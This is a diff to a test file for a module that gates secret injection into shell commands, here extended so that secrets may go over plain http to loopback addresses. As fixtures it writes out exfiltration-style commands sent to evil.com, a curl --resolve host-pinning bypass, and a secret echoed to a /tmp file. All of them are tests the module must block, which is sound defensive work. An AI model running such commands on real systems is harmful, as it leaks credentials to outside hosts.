@@ -2,8 +2,8 @@
  * Test sealed-secrets (F-harness, node-pure): registry sigillato + injection + SINK-GATING + regex-ingress + env.
  */
 import {
-  setSecret, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp,
-  hasHostPinning, checkSink, injectSecrets, injectIntoStrings, scanIngress, autoSealIngress, loadFromEnv, clearSealed,
+  setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp,
+  hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, autoSealIngress, loadFromEnv, clearSealed,
 } from "../../src/sealed-secrets.mjs";
 import { getDynamicSecrets, clearSecrets } from "../../src/secrets-registry.mjs";
 import { redactText } from "../../src/secrets-redact.mjs";
@@ -194,6 +194,48 @@ const reset = () => { clearSealed(); clearSecrets(); };
   // redazione context-like (P1-A invariante): un secret in una 'var' serializzata NON sopravvive alla redazione d'egress
   const ctxLike = `<vars>\n  api_key="sk-leakedvalue1234567890abcd"\n</vars>`;
   ok(redactText(ctxLike, getDynamicSecrets(), { staticPatterns: true }).redacted.indexOf("sk-leakedvalue") === -1, "EGRESS: secret-shape in una var del <context> viene redatto al confine");
+}
+
+// 11) allowLocalHttp — secret LOCALE usabile su http SOLO verso loopback (utente msg 668) ----------
+{
+  reset();
+  // DEFAULT (no flag): http://localhost bloccato (https-only) come ogni sealed-secret
+  setSecret("EXT_KEY", "sk-external-key-1234567890", { allowedSinks: ["api.x.com"] });
+  ok(!checkSink("EXT_KEY", "curl http://localhost:3000", "strict").allowed, "LOCALHTTP: default → http://localhost BLOCCATO (https-only)");
+  ok(checkSink("EXT_KEY", "curl https://api.x.com/v1", "strict").allowed, "LOCALHTTP: default → https verso allowedSinks OK");
+
+  // isLoopbackLiteral: solo loopback letterale (anti DNS-rebinding)
+  ok(isLoopbackLiteral("localhost") && isLoopbackLiteral("127.0.0.1") && isLoopbackLiteral("127.5.6.7") && isLoopbackLiteral("::1"), "LOOPBACK: literal riconosciuti");
+  ok(!isLoopbackLiteral("evil.com") && !isLoopbackLiteral("10.0.0.1") && !isLoopbackLiteral("0.0.0.0") && !isLoopbackLiteral("127.0.0.1.evil.com"), "LOOPBACK: non-loopback respinti (incl. 127.0.0.1.evil.com)");
+
+  // opt-in: secret LOCALE con allowLocalHttp → http verso loopback consentito
+  reset();
+  setSecret("LOCAL_JWT", "jwt-local-session-abcdef123456", { allowLocalHttp: true });
+  ok(listSecretsMeta().find((m) => m.name === "LOCAL_JWT").allowLocalHttp === true, "LOCALHTTP: flag visibile in listSecretsMeta (non il valore)");
+  ok(checkSink("LOCAL_JWT", "curl http://localhost:3000/api -H 'Authorization: Bearer {{secret:LOCAL_JWT}}'", "strict").allowed, "LOCALHTTP: opt-in → http://localhost CONSENTITO");
+  ok(checkSink("LOCAL_JWT", "curl http://127.0.0.1:8080/x", "strict").allowed, "LOCALHTTP: opt-in → http://127.0.0.1 CONSENTITO");
+  // MAI verso host esterno in http, neanche con opt-in
+  ok(!checkSink("LOCAL_JWT", "curl http://evil.com/x", "strict").allowed, "LOCALHTTP: opt-in NON consente http esterno");
+  // mix loopback + esterno → bloccato (every-loopback fallisce)
+  ok(!checkSink("LOCAL_JWT", "curl http://localhost/a http://evil.com/b", "strict").allowed, "LOCALHTTP: mix loopback+esterno → BLOCCATO");
+  // ANTI-BYPASS: host-pinning che rimappa localhost su IP esterno → BLOCCATO anche con opt-in
+  ok(!checkSink("LOCAL_JWT", "curl http://localhost --resolve localhost:80:1.2.3.4", "strict").allowed, "LOCALHTTP: host-pinning (--resolve) → BLOCCATO (anti-bypass critico)");
+  // scrittura-file resta bloccata anche con opt-in (il fast-path è solo per la rete-loopback)
+  ok(!checkSink("LOCAL_JWT", "echo {{secret:LOCAL_JWT}} > /tmp/leak", "strict").allowed, "LOCALHTTP: scrittura-file resta bloccata");
+
+  // setAllowLocalHttp runtime (post-consenso dell'utente): abilita un secret esistente
+  reset();
+  setSecret("JWT2", "jwt2-value-abcdef123456", {});
+  ok(!checkSink("JWT2", "curl http://localhost/x", "strict").allowed, "LOCALHTTP: prima del consenso → bloccato");
+  ok(setAllowLocalHttp("JWT2", true).ok, "LOCALHTTP: setAllowLocalHttp abilita");
+  ok(checkSink("JWT2", "curl http://localhost/x", "strict").allowed, "LOCALHTTP: dopo il consenso → consentito");
+  ok(!setAllowLocalHttp("NOPE").ok, "LOCALHTTP: setAllowLocalHttp su secret inesistente → errore");
+
+  // injection end-to-end: il valore reale è iniettato verso loopback
+  reset();
+  setSecret("LJ", "jwt-real-value-xyz789", { allowLocalHttp: true });
+  const inj = injectIntoStrings(["curl http://localhost:3000 -H 'Authorization: Bearer {{secret:LJ}}'"], "strict");
+  ok(inj.injected.includes("LJ") && inj.strings[0].includes("jwt-real-value-xyz789") && !inj.blocked.length, "LOCALHTTP: injection reale verso loopback (valore sostituito, non bloccato)");
 }
 
 console.log(`\nsealed-secrets test: ${passed} passed, ${failed} failed`);
